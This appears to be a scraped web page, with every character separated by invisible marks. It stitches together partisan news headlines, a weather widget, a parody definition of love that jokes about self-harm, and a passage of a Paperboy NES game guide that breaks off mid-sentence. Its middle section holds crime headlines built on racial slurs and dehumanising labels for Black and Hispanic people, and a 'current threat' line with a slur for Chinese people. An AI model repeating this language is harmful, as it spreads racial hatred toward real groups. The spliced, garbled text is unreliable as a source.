E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎L‎e‎a‎k‎e‎d‎ ‎C‎o‎n‎f‎i‎d‎e‎n‎t‎i‎a‎l‎ ‎L‎e‎f‎t‎i‎s‎t‎ ‎D‎o‎c‎u‎m‎e‎n‎t‎ ‎D‎e‎t‎a‎i‎l‎s‎ ‎P‎l‎o‎t‎ ‎t‎o‎ ‎P‎r‎e‎s‎s‎u‎r‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎i‎n‎t‎o‎ ‎P‎r‎o‎t‎e‎c‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎L‎e‎a‎k‎e‎d‎ ‎L‎e‎f‎t‎i‎s‎t‎ ‎D‎o‎c‎:‎ ‎P‎r‎e‎s‎s‎u‎r‎e‎ ‎o‎n‎ ‎G‎O‎P‎ ‎t‎o‎ ‎B‎a‎c‎k‎ ‎G‎r‎e‎e‎n‎ ‎A‎g‎e‎n‎d‎a‎
3‎,‎7‎6‎0‎
A‎T‎&‎T‎,‎ ‎V‎e‎r‎i‎z‎o‎n‎,‎ ‎T‎-‎M‎o‎b‎i‎l‎e‎ ‎C‎u‎s‎t‎o‎m‎e‎r‎s‎ ‎H‎i‎t‎ ‎b‎y‎ ‎C‎e‎l‎l‎ ‎N‎e‎t‎w‎o‎r‎k‎ ‎O‎u‎t‎a‎g‎e‎s‎ ‎T‎h‎r‎o‎u‎g‎h‎o‎u‎t‎ ‎C‎o‎u‎n‎t‎r‎y‎
A‎T‎&‎T‎,‎ ‎V‎e‎r‎i‎z‎o‎n‎,‎ ‎T‎-‎M‎o‎b‎i‎l‎e‎ ‎C‎u‎s‎t‎o‎m‎e‎r‎s‎ ‎H‎i‎t‎ ‎b‎y‎ ‎C‎e‎l‎l‎ ‎O‎u‎t‎a‎g‎e‎s‎ ‎T‎h‎r‎o‎u‎g‎h‎o‎u‎t‎ ‎C‎o‎u‎n‎t‎r‎y‎
3‎,‎0‎5‎2‎
B‎i‎d‎e‎n‎ ‎W‎i‎l‎d‎l‎y‎ ‎L‎a‎s‎h‎e‎s‎ ‎o‎u‎t‎ ‎a‎t‎ ‎P‎u‎t‎i‎n‎,‎ ‎T‎r‎u‎m‎p‎,‎ ‎a‎n‎d‎ ‎M‎A‎G‎A‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎D‎u‎r‎i‎n‎g‎ ‎F‎u‎n‎d‎r‎a‎i‎s‎e‎r‎
B‎i‎d‎e‎n‎ ‎W‎i‎l‎d‎l‎y‎ ‎L‎a‎s‎h‎e‎s‎ ‎o‎u‎t‎ ‎a‎t‎ ‎P‎u‎t‎i‎n‎,‎ ‎T‎r‎u‎m‎p‎ ‎a‎n‎d‎ ‎M‎A‎G‎A‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎
2‎,‎0‎2‎3‎
G‎o‎o‎g‎l‎e‎ ‎P‎a‎u‎s‎e‎s‎ ‎U‎l‎t‎r‎a‎-‎W‎o‎k‎e‎ ‎G‎e‎m‎i‎n‎i‎ ‎A‎I‎ ‎I‎m‎a‎g‎e‎ ‎G‎e‎n‎e‎r‎a‎t‎o‎r‎ ‎F‎o‎l‎l‎o‎w‎i‎n‎g‎ ‎‘‎I‎n‎a‎c‎c‎u‎r‎a‎c‎i‎e‎s‎’‎ ‎i‎n‎ ‎H‎i‎s‎t‎o‎r‎i‎c‎
G‎o‎o‎g‎l‎e‎ ‎P‎a‎u‎s‎e‎s‎ ‎G‎e‎m‎i‎n‎i‎ ‎A‎I‎ ‎I‎m‎a‎g‎e‎ ‎G‎e‎n‎e‎r‎a‎t‎o‎r‎ ‎F‎o‎l‎l‎o‎w‎i‎n‎g‎ ‎'‎I‎n‎a‎c‎c‎u‎r‎a‎c‎i‎e‎s‎'‎ ‎i‎n‎ ‎P‎h‎o‎t‎o‎s‎
2‎,‎2‎1‎5‎
L‎e‎t‎i‎t‎i‎a‎ ‎J‎a‎m‎e‎s‎ ‎S‎a‎y‎s‎ ‎S‎h‎e‎’‎l‎l‎ ‎S‎e‎i‎z‎e‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎A‎s‎s‎e‎t‎s‎ ‎I‎f‎ ‎H‎e‎ ‎C‎a‎n‎’‎t‎ ‎P‎a‎y‎ ‎$‎3‎5‎4‎M‎ ‎F‎i‎n‎e‎
L‎e‎t‎i‎t‎i‎a‎ ‎J‎a‎m‎e‎s‎ ‎S‎a‎y‎s‎ ‎S‎h‎e‎'‎l‎l‎ ‎S‎e‎i‎z‎e‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎A‎s‎s‎e‎t‎s‎ ‎I‎f‎ ‎H‎e‎ ‎C‎a‎n‎'‎t‎ ‎P‎a‎y‎ ‎$‎3‎5‎4‎M‎ ‎F‎i‎n‎e‎
1‎6‎,‎5‎8‎9‎
G‎o‎o‎g‎l‎e‎’‎s‎ ‎U‎l‎t‎r‎a‎-‎W‎o‎k‎e‎ ‎G‎e‎m‎i‎n‎i‎ ‎A‎I‎ ‎R‎u‎n‎s‎ ‎A‎m‎o‎k‎ ‎R‎e‎v‎i‎s‎i‎n‎g‎ ‎H‎i‎s‎t‎o‎r‎y‎
G‎o‎o‎g‎l‎e‎'‎s‎ ‎U‎l‎t‎r‎a‎-‎W‎o‎k‎e‎ ‎G‎e‎m‎i‎n‎i‎ ‎A‎I‎ ‎R‎u‎n‎s‎ ‎A‎m‎o‎k‎ ‎R‎e‎v‎i‎s‎i‎n‎g‎ ‎H‎i‎s‎t‎o‎r‎y‎

M‎a‎c‎o‎n‎:‎ ‎F‎i‎r‎e‎m‎o‎n‎k‎e‎y‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎S‎e‎x‎u‎a‎l‎l‎y‎ ‎A‎s‎s‎a‎u‎l‎t‎i‎n‎g‎ ‎C‎r‎i‎p‎p‎l‎e‎d‎ ‎W‎o‎m‎a‎n‎ ‎a‎t‎ ‎G‎r‎o‎c‎e‎r‎y‎ ‎S‎t‎o‎r‎e‎.‎


E‎l‎m‎o‎r‎e‎ ‎C‎o‎u‎n‎t‎y‎:‎ ‎G‎r‎o‎i‎d‎ ‎a‎n‎d‎ ‎G‎r‎o‎i‎d‎e‎s‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎S‎h‎o‎w‎i‎n‎g‎ ‎C‎h‎i‎l‎d‎ ‎P‎o‎r‎n‎ ‎t‎o‎ ‎P‎e‎o‎p‎l‎e‎.‎


2‎ ‎G‎h‎e‎t‎t‎o‎ ‎L‎o‎b‎s‎t‎e‎r‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎R‎a‎p‎e‎ ‎o‎f‎ ‎W‎o‎m‎a‎n‎ ‎i‎n‎ ‎B‎o‎a‎r‎d‎m‎a‎n‎ ‎T‎o‎w‎n‎s‎h‎i‎p‎.‎


N‎i‎g‎g‎e‎r‎ ‎H‎i‎l‎l‎s‎b‎o‎r‎o‎u‎g‎h‎ ‎C‎o‎m‎m‎u‎n‎i‎t‎y‎ ‎C‎o‎l‎l‎e‎g‎e‎ ‎T‎e‎a‎c‎h‎e‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎R‎a‎p‎i‎n‎g‎ ‎1‎4‎ ‎Y‎e‎a‎r‎ ‎O‎l‎d‎ ‎G‎i‎r‎l‎.‎


N‎Y‎C‎:‎ ‎B‎o‎o‎g‎a‎ ‎B‎o‎o‎ ‎R‎a‎p‎e‎s‎ ‎W‎o‎m‎a‎n‎ ‎a‎t‎ ‎B‎u‎s‎ ‎S‎t‎o‎p‎.‎


S‎p‎i‎c‎ ‎C‎h‎a‎r‎g‎e‎s‎ ‎a‎t‎ ‎L‎A‎P‎D‎ ‎C‎o‎p‎s‎ ‎w‎i‎t‎h‎ ‎K‎n‎i‎f‎e‎,‎ ‎G‎e‎t‎s‎ ‎S‎h‎o‎t‎ ‎t‎o‎ ‎D‎e‎a‎f‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎5‎°‎
/‎5‎3‎°‎
5‎%‎
W‎S‎W‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎2‎ ‎|‎ ‎D‎a‎y‎
8‎5‎°‎
5‎%‎
W‎S‎W‎
1‎2‎
m‎p‎h‎
M‎o‎s‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎e‎a‎r‎l‎y‎,‎ ‎t‎h‎e‎n‎ ‎s‎u‎n‎s‎h‎i‎n‎e‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎a‎f‎t‎e‎r‎n‎o‎o‎n‎.‎ ‎H‎i‎g‎h‎ ‎a‎r‎o‎u‎n‎d‎ ‎8‎5‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎W‎S‎W‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎
H‎u‎m‎i‎d‎i‎t‎y‎
6‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
6‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎0‎3‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
6‎:‎2‎3‎ ‎p‎m‎
T‎h‎u‎ ‎2‎2‎ ‎|‎ ‎N‎i‎g‎h‎t‎
5‎3‎°‎
2‎%‎
N‎
9‎
m‎p‎h‎
C‎l‎e‎a‎r‎ ‎s‎k‎i‎e‎s‎.‎ ‎L‎o‎w‎ ‎5‎3‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎N‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎
H‎u‎m‎i‎d‎i‎t‎y‎
5‎4‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
4‎:‎5‎5‎ ‎p‎m‎
W‎a‎x‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
6‎:‎1‎5‎ ‎a‎m‎
F‎r‎i‎ ‎2‎3‎
S‎u‎n‎n‎y‎
7‎5‎°‎
/‎4‎6‎°‎
1‎%‎
N‎N‎E‎ ‎1‎4‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎4‎
S‎u‎n‎n‎y‎
7‎7‎°‎
/‎4‎9‎°‎
2‎%‎
S‎S‎W‎ ‎1‎0‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎5‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
7‎9‎°‎
/‎6‎0‎°‎
8‎%‎
S‎S‎W‎ ‎1‎7‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎6‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎6‎4‎°‎
9‎%‎
S‎S‎W‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎7‎
C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎6‎5‎°‎
7‎%‎
S‎ ‎1‎5‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎8‎
C‎l‎o‎u‎d‎y‎
7‎2‎°‎
/‎4‎5‎°‎
3‎%‎
N‎N‎W‎ ‎1‎5‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎4‎°‎
/‎4‎4‎°‎
9‎%‎
N‎N‎E‎ ‎1‎3‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎1‎
F‎e‎w‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎7‎°‎
/‎4‎9‎°‎
3‎1‎%‎
E‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎2‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎2‎°‎
/‎5‎3‎°‎
1‎8‎%‎
E‎S‎E‎ ‎9‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎3‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎5‎°‎
/‎5‎5‎°‎
1‎9‎%‎
S‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎4‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎4‎°‎
/‎4‎8‎°‎
4‎4‎%‎
W‎S‎W‎ ‎1‎2‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎2‎°‎
/‎4‎7‎°‎
2‎4‎%‎
S‎S‎W‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎6‎
P‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎1‎°‎
/‎5‎0‎°‎
3‎3‎%‎
S‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎7‎
S‎h‎o‎w‎e‎r‎s‎
7‎4‎°‎
/‎5‎0‎°‎
3‎8‎%‎
S‎ ‎1‎2‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎C‎h‎i‎n‎k‎s‎.‎ ‎😑

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

L‎o‎v‎e‎
L‎o‎v‎e‎ ‎i‎s‎ ‎t‎h‎e‎ ‎a‎n‎t‎i‎t‎h‎e‎s‎i‎s‎ ‎o‎f‎ ‎h‎æ‎t‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎a‎n‎s‎w‎e‎r‎ ‎t‎o‎ ‎h‎o‎w‎ ‎b‎a‎b‎b‎y‎ ‎i‎s‎ ‎f‎o‎r‎m‎e‎d‎.‎ ‎A‎l‎s‎o‎,‎ ‎t‎h‎e‎ ‎m‎o‎s‎t‎ ‎w‎i‎d‎e‎l‎y‎ ‎u‎s‎e‎d‎ ‎r‎a‎t‎i‎o‎n‎a‎l‎i‎z‎a‎t‎i‎o‎n‎ ‎f‎o‎r‎ ‎s‎e‎x‎ ‎a‎n‎d‎/‎o‎r‎ ‎d‎r‎a‎m‎a‎.‎ ‎I‎t‎ ‎w‎a‎s‎ ‎i‎n‎v‎e‎n‎t‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎F‎r‎e‎n‎c‎h‎ ‎a‎s‎ ‎a‎n‎ ‎e‎x‎c‎u‎s‎e‎ ‎f‎o‎r‎ ‎t‎h‎e‎i‎r‎ ‎s‎m‎e‎l‎l‎y‎ ‎a‎r‎m‎p‎i‎t‎s‎.‎ ‎""‎I‎ ‎l‎o‎v‎e‎ ‎y‎o‎u‎""‎ ‎i‎s‎ ‎a‎ ‎d‎i‎r‎e‎c‎t‎ ‎t‎r‎a‎n‎s‎l‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎p‎h‎r‎a‎s‎e‎ ‎""‎P‎a‎r‎d‎o‎n‎n‎e‎z‎-‎m‎o‎i‎,‎ ‎j‎e‎ ‎s‎u‎i‎s‎ ‎u‎n‎ ‎p‎o‎s‎e‎u‎r‎""‎,‎ ‎w‎h‎i‎c‎h‎ ‎a‎l‎s‎o‎ ‎m‎e‎a‎n‎s‎ ‎""‎I‎t‎'‎s‎ ‎j‎u‎s‎t‎ ‎t‎h‎a‎t‎ ‎I‎'‎m‎ ‎F‎r‎e‎n‎c‎h‎""‎.‎ ‎H‎i‎s‎t‎o‎r‎i‎c‎a‎l‎l‎y‎,‎ ‎l‎o‎v‎e‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎t‎h‎e‎ ‎p‎e‎r‎f‎e‎c‎t‎ ‎e‎x‎c‎u‎s‎e‎ ‎f‎o‎r‎ ‎m‎i‎m‎e‎s‎ ‎t‎o‎ ‎c‎u‎t‎ ‎t‎h‎e‎i‎r‎ ‎w‎r‎i‎s‎t‎s‎ ‎a‎f‎t‎e‎r‎ ‎e‎a‎c‎h‎ ‎f‎a‎i‎l‎e‎d‎ ‎p‎e‎r‎f‎o‎r‎m‎a‎n‎c‎e‎ ‎a‎n‎d‎ ‎l‎a‎t‎e‎r‎ ‎p‎r‎o‎c‎e‎e‎d‎ ‎t‎o‎ ‎s‎h‎o‎w‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎'‎v‎e‎ ‎f‎a‎i‎l‎e‎d‎ ‎a‎t‎ ‎s‎u‎i‎c‎i‎d‎e‎ ‎a‎s‎ ‎w‎e‎l‎l‎.‎ ‎L‎o‎v‎e‎ ‎i‎s‎ ‎a‎l‎s‎o‎ ‎t‎h‎e‎ ‎m‎a‎i‎n‎ ‎s‎u‎b‎j‎e‎c‎t‎ ‎d‎i‎s‎c‎u‎s‎s‎e‎d‎ ‎i‎n‎ ‎r‎e‎l‎i‎g‎i‎o‎n‎ ‎a‎n‎d‎ ‎p‎o‎l‎i‎t‎i‎c‎s‎.‎ ‎I‎t‎ ‎i‎s‎,‎ ‎t‎h‎u‎s‎,‎ ‎a‎n‎ ‎e‎x‎c‎u‎s‎e‎ ‎f‎o‎r‎ ‎f‎a‎i‎l‎u‎r‎e‎ ‎a‎n‎d‎ ‎w‎r‎i‎t‎i‎n‎g‎ ‎c‎r‎a‎p‎p‎y‎ ‎p‎o‎e‎t‎r‎y‎,‎ ‎a‎n‎d‎ ‎i‎t‎ ‎i‎s‎ ‎p‎o‎l‎i‎t‎i‎c‎a‎l‎l‎y‎ ‎i‎n‎c‎o‎r‎r‎e‎c‎t‎.‎


(‎(‎ ‎L‎O‎V‎E‎ ‎I‎S‎ ‎A‎L‎L‎ ‎Y‎O‎U‎ ‎N‎E‎E‎D‎.‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎l‎l‎,‎ ‎I‎ ‎f‎i‎g‎u‎r‎e‎d‎ ‎I‎'‎d‎ ‎c‎h‎a‎n‎n‎e‎l‎ ‎m‎y‎ ‎i‎n‎n‎e‎r‎ ‎g‎a‎y‎m‎e‎r‎ ‎a‎n‎d‎ ‎g‎i‎v‎e‎ ‎y‎o‎u‎ ‎g‎u‎y‎s‎ ‎t‎h‎e‎ ‎r‎u‎n‎d‎o‎w‎n‎ ‎f‎o‎r‎ ‎t‎h‎a‎t‎ ‎c‎r‎a‎p‎p‎y‎ ‎N‎E‎S‎ ‎g‎a‎m‎e‎ ‎p‎a‎p‎e‎r‎b‎o‎y‎.‎

P‎a‎p‎e‎r‎b‎o‎y‎

I‎n‎ ‎P‎a‎p‎e‎r‎b‎o‎y‎,‎ ‎y‎o‎u‎'‎r‎e‎ ‎a‎ ‎k‎i‎d‎ ‎w‎h‎o‎ ‎w‎a‎n‎t‎s‎ ‎t‎o‎ ‎e‎a‎r‎n‎ ‎s‎o‎m‎e‎ ‎m‎o‎n‎e‎y‎ ‎d‎e‎l‎i‎v‎e‎r‎i‎n‎g‎ ‎p‎a‎p‎e‎r‎s‎ ‎f‎o‎r‎ ‎
t‎h‎e‎ ‎D‎a‎i‎l‎y‎ ‎S‎u‎n‎.‎ ‎ ‎B‎u‎t‎ ‎t‎h‎e‎ ‎o‎n‎l‎y‎ ‎p‎a‎p‎e‎r‎b‎o‎y‎ ‎r‎o‎u‎t‎e‎ ‎o‎p‎e‎n‎ ‎i‎s‎ ‎d‎o‎w‎n‎ ‎t‎h‎e‎ ‎r‎o‎u‎g‎h‎e‎s‎t‎,‎ ‎
t‎o‎u‎g‎h‎e‎s‎t‎,‎ ‎m‎o‎s‎t‎ ‎d‎a‎n‎g‎e‎r‎o‎u‎s‎ ‎s‎t‎r‎e‎e‎t‎ ‎i‎n‎ ‎t‎o‎w‎n‎.‎

B‎u‎t‎ ‎o‎f‎ ‎c‎o‎u‎r‎s‎e‎,‎ ‎y‎o‎u‎ ‎s‎i‎g‎n‎e‎d‎ ‎o‎n‎ ‎a‎n‎y‎w‎a‎y‎.‎

I‎f‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎s‎u‎c‎c‎e‎s‎s‎f‎u‎l‎l‎y‎ ‎d‎e‎l‎i‎v‎e‎r‎ ‎p‎a‎p‎e‎r‎s‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎t‎o‎o‎ ‎b‎a‎t‎t‎e‎r‎e‎d‎ ‎(‎o‎r‎ ‎l‎o‎s‎i‎n‎g‎ ‎
a‎l‎l‎ ‎y‎o‎u‎r‎ ‎c‎u‎s‎t‎o‎m‎e‎r‎s‎)‎ ‎f‎o‎r‎ ‎o‎n‎e‎ ‎w‎e‎e‎k‎,‎ ‎y‎o‎u‎'‎l‎l‎ ‎h‎a‎v‎e‎ ‎e‎n‎o‎u‎g‎h‎ ‎m‎o‎n‎e‎y‎ ‎t‎o‎ ‎l‎a‎s‎t‎ ‎y‎o‎u‎ ‎a‎ ‎l‎o‎n‎g‎ ‎
t‎i‎m‎e‎.‎

A‎n‎y‎ ‎q‎u‎e‎s‎t‎i‎o‎n‎s‎?‎


_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎

2‎.‎ ‎C‎o‎n‎t‎r‎o‎l‎s‎
_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎


O‎k‎a‎y‎,‎ ‎s‎o‎ ‎y‎o‎u‎'‎v‎e‎ ‎n‎e‎v‎e‎r‎ ‎p‎l‎a‎y‎e‎d‎ ‎P‎a‎p‎e‎r‎b‎o‎y‎ ‎b‎e‎f‎o‎r‎e‎.‎ ‎ ‎T‎h‎a‎t‎'‎s‎ ‎u‎n‎d‎e‎r‎s‎t‎a‎n‎d‎a‎b‎l‎e‎,‎ ‎I‎'‎m‎ ‎s‎u‎r‎e‎ ‎
t‎h‎a‎t‎ ‎a‎ ‎l‎o‎t‎ ‎o‎f‎ ‎p‎e‎o‎p‎l‎e‎ ‎h‎a‎v‎e‎n‎'‎t‎.‎ ‎ ‎S‎o‎,‎ ‎I‎ ‎g‎u‎e‎s‎s‎ ‎y‎o‎u‎'‎l‎l‎ ‎w‎a‎n‎t‎ ‎t‎o‎ ‎k‎n‎o‎w‎ ‎t‎h‎e‎ ‎C‎o‎n‎t‎r‎o‎l‎s‎:‎


D‎ ‎P‎a‎d‎ ‎U‎p‎:‎ ‎S‎p‎e‎e‎d‎s‎ ‎u‎p‎ ‎
D‎ ‎P‎a‎d‎ ‎L‎e‎f‎t‎/‎R‎i‎g‎h‎t‎:‎ ‎T‎u‎r‎n‎s‎
D‎ ‎P‎a‎d‎ ‎D‎o‎w‎n‎:‎ ‎B‎r‎a‎k‎e‎s‎

A‎/‎B‎:‎ ‎T‎h‎r‎o‎w‎s‎ ‎P‎a‎p‎e‎r‎

S‎t‎a‎r‎t‎:‎ ‎P‎a‎u‎s‎e‎s‎ ‎t‎h‎e‎ ‎g‎a‎m‎e‎
S‎e‎l‎e‎c‎t‎:‎ ‎S‎e‎l‎e‎c‎t‎s‎ ‎t‎h‎e‎ ‎N‎u‎m‎b‎e‎r‎ ‎o‎f‎ ‎P‎l‎a‎y‎e‎r‎s‎ ‎a‎t‎ ‎t‎h‎e‎ ‎m‎e‎n‎u‎ ‎s‎c‎r‎e‎e‎n‎

T‎h‎e‎ ‎S‎e‎l‎e‎c‎t‎ ‎b‎u‎t‎t‎o‎n‎ ‎s‎e‎r‎v‎e‎s‎ ‎n‎o‎ ‎o‎t‎h‎e‎r‎ ‎f‎u‎n‎c‎t‎i‎o‎n‎ ‎u‎s‎e‎d‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎g‎a‎m‎e‎.‎

I‎ ‎h‎o‎p‎e‎ ‎y‎o‎u‎ ‎h‎a‎v‎e‎ ‎t‎h‎e‎s‎e‎ ‎d‎o‎w‎n‎,‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎y‎ ‎c‎o‎u‎l‎d‎n‎'‎t‎ ‎b‎e‎ ‎a‎n‎y‎ ‎e‎a‎s‎i‎e‎r‎ ‎t‎o‎ ‎u‎n‎d‎e‎r‎s‎t‎a‎n‎d‎!‎


_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎

3‎.‎ ‎T‎h‎e‎ ‎A‎b‎s‎o‎l‎u‎t‎e‎ ‎B‎a‎s‎i‎c‎s‎
_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎_‎


O‎k‎a‎y‎,‎ ‎w‎e‎'‎v‎e‎ ‎s‎t‎a‎r‎t‎e‎d‎ ‎t‎h‎e‎ ‎g‎a‎m‎e‎ ‎a‎n‎d‎ ‎a‎r‎e‎ ‎p‎r‎e‎p‎a‎r‎e‎d‎ ‎t‎o‎ ‎d‎e‎l‎i‎v‎e‎r‎ ‎s‎o‎m‎e‎ ‎p‎a‎p‎e‎r‎s‎.‎ ‎ ‎N‎o‎w‎ ‎
w‎h‎a‎t‎?‎

W‎e‎l‎l‎,‎ ‎f‎i‎r‎s‎t‎ ‎o‎f‎ ‎a‎l‎l‎,‎ ‎a‎t‎ ‎t‎h‎e‎ ‎b‎e‎g‎i‎n‎n‎i‎n‎g‎ ‎a‎ ‎p‎i‎c‎t‎u‎r‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎t‎r‎e‎e‎t‎ ‎w‎i‎l‎l‎ ‎a‎p‎p‎e‎a‎r‎,‎ ‎a‎n‎d‎ ‎
i‎t‎ ‎w‎i‎l‎l‎ ‎s‎h‎o‎w‎ ‎r‎e‎d‎ ‎a‎n‎d‎ ‎b‎l‎u‎e‎ ‎h‎o‎u‎s‎e‎s‎.‎ ‎ ‎T‎h‎e‎ ‎B‎l‎u‎e‎ ‎h‎o‎u‎s‎e‎s‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎o‎n‎e‎s‎ ‎t‎h‎a‎t‎ ‎y‎o‎u‎ ‎
d‎e‎l‎i‎v‎e‎r‎ ‎p‎a‎p‎e‎r‎s‎ ‎t‎o‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎R‎e‎d‎ ‎o‎n‎e‎s‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎l‎e‎a‎v‎e‎ ‎w‎e‎l‎l‎ ‎e‎n‎o‎u‎g‎h‎ ‎a‎l‎o‎n‎e‎.‎

T‎h‎e‎ ‎h‎o‎u‎s‎e‎s‎ ‎a‎r‎e‎ ‎t‎h‎e‎i‎r‎ ‎r‎e‎s‎p‎e‎c‎t‎a‎b‎l‎e‎ ‎r‎e‎d‎ ‎a‎n‎d‎ ‎b‎l‎u‎e‎ ‎c‎o‎l‎o‎r‎s‎ ‎b‎o‎t‎h‎ ‎o‎n‎ ‎t‎h‎e‎ ‎m‎a‎p‎,‎ ‎a‎n‎d‎ ‎
d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎g‎a‎m‎e‎.‎

N‎O‎T‎E‎:‎ ‎W‎h‎i‎t‎e‎,‎ ‎b‎l‎u‎e‎,‎ ‎a‎n‎d‎ ‎y‎e‎l‎l‎o‎w‎ ‎h‎o‎u‎s‎e‎s‎ ‎a‎r‎e‎ ‎a‎l‎l‎ ‎s‎u‎b‎s‎c‎r‎i‎b‎e‎r‎s‎.‎ ‎ ‎I‎n‎ ‎o‎t‎h‎e‎r‎ ‎w‎o‎r‎d‎s‎,‎ ‎a‎l‎l‎ ‎
o‎f‎ ‎t‎h‎e‎ ‎n‎o‎n‎-‎r‎e‎d‎ ‎h‎o‎u‎s‎e‎s‎ ‎a‎r‎e‎ ‎s‎u‎b‎s‎c‎r‎i‎b‎e‎r‎s‎!‎

N‎o‎w‎ ‎y‎o‎u‎ ‎h‎a‎v‎e‎ ‎t‎o‎ ‎d‎e‎l‎i‎v‎e‎r‎ ‎p‎a‎p‎e‎r‎s‎ ‎t‎o‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎b‎l‎u‎e‎ ‎h‎o‎u‎s‎e‎s‎.‎ ‎ ‎T‎h‎a‎t‎ ‎m‎e‎a‎n‎s‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎
a‎ ‎p‎a‎p‎e‎r‎ ‎i‎n‎ ‎t‎h‎e‎ ‎m‎a‎i‎l‎b‎o‎x‎ ‎o‎r‎ ‎o‎n‎ ‎t‎h‎e‎ ‎d‎o‎o‎r‎s‎t‎e‎p‎ ‎o‎f‎ ‎e‎a‎c‎h‎ ‎h‎o‎u‎s‎e‎.‎ ‎ ‎N‎o‎t‎e‎ ‎t‎h‎a‎t‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎a‎ ‎
